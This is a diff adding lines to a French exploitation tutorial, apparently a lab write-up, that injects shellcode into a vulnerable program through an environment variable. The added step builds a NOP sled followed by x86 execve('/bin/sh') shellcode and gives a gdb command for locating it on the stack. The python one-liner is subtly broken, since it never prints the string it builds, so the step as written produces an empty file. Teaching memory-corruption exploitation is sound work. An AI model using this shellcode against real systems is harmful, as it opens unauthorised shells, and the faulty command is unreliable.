@@ -102,6 +102,16 @@ La case mémoire qui contient l'adresse de retour de la fonction `main()` se sit
 
 Pour injecter le code de l'exploit dans le processus, nous passons par l'intermédiaire d'une variable d'environnement.
 
+Pour créer la variable d'environnement:
+
+	python -c '"\x90"*(44+x) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > file
+	export MA_VARIABLE=$(cat file)
+
+Avec `x` = 4, 8 ou 12.
+
+> * Il faut relancer le programme après création/modification de la variable d'environnement.
+> * "\x90" est le code de l'instruction `NOP`.
+
 Pour connaître l'adresse du code qui contient l'exploit:
 
 	x/1000s $esp
